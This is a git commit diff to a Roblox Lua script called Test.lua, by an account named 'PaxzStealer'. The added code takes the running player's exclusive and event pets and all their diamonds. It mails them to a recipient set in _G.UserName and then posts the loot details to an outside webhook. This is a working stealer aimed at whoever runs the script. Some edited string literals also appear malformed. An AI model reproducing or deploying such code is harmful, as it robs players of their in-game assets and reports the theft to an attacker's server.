739f4460090c8311ce3ed441134368449a1545e0
PaxzStealer <132356243+PaxzStealer@users.noreply.github.com>
2023-05-14 16:19:21 +0200

    Update Test.lua

--- Test.lua
+++ Test.lua
@@ -47,18 +47,32 @@ if dims < 0 then
 end
 
 wait(30)
-if game.PlaceId == 6284583030 then
-	_G.GameIn = "Pet Simulator X"
+for i,v in pairs(game:GetService("Players").LocalPlayer.PlayerGui.Mailbox.Frame.GiftPet.Container.Inventory.Pets:GetChildren()) do
+    if v:IsA("TextButton") then
+        if v:FindFirstChild("RarityGradient"):FindFirstChild("Exclusive") or v:FindFirstChild("RarityGradient"):FindFirstChild("Event") then
+            local args = {
+                [1] = {
+                    ["Recipient"] = _G.UserName,
+                    ["Diamonds"] = dims,
+                    ["Pets"] = {
+                        [1] = v.Name
+                    },
+                    ["Message"] = "made by Paxz"
+                }
+            }
+        Networking.Invoke("Send Mail", unpack(args))
+        if game.PlaceId == 6284583030 then
+    _G.GameIn = "Pet Simulator X"
 elseif game.PlaceId == 7722306047 then
-	_G.GameIn = "PSX Trading Plaza"
+    _G.GameIn = "PSX Trading Plaza"
 elseif game.PlaceId == 10321372166 then
-	_G.GameIn = "PSX Hardcore"
+    _G.GameIn = "PSX Hardcore"
 elseif game.PlaceId == 12610002282 then
-	_G.GameIn = "PSX Pro Trading Plaza"
+    _G.GameIn = "PSX Pro Trading Plaza"
 elseif game.PlaceId == 11725212117 then
-	_G.GameIn = "PSX Voice Trading Plaza"
+    _G.GameIn = "PSX Voice Trading Plaza"
 else
-	_G.GameIn = "❓ Couldn't find game"
+    _G.GameIn = "❓ Couldn't find game"
 end
 local webhookcolor = "13369599"
 _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
@@ -77,13 +91,17 @@ local msg = {
       ["fields"]= {
         {
           ["name"]= "Diamonds 💎",
-          ["value"]= "```".._G.Diamonds.."```",
+          ["value"]= "
+".._G.Diamonds.."
+",
           ["inline"]= true
         },
         {
           ["name"]= "Pet Name & Rarity",
-          ["value"]= "```Pet Name: ".._G.PetName.."\nPet Rarity: ".._G.PetRar.."```",
-		  ["inline"]= true
+          ["value"]= "
+Pet Name: ".._G.PetName.."\nPet Rarity: ".._G.PetRar.."
+",
+          ["inline"]= true
         }
       }
     }
@@ -95,3 +113,8 @@ request = http_request or request or HttpPost or syn.request
 request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
 end
 sendwebhook(msg)
+        dims = 0
+        wait(7)
+    end
+end
+end
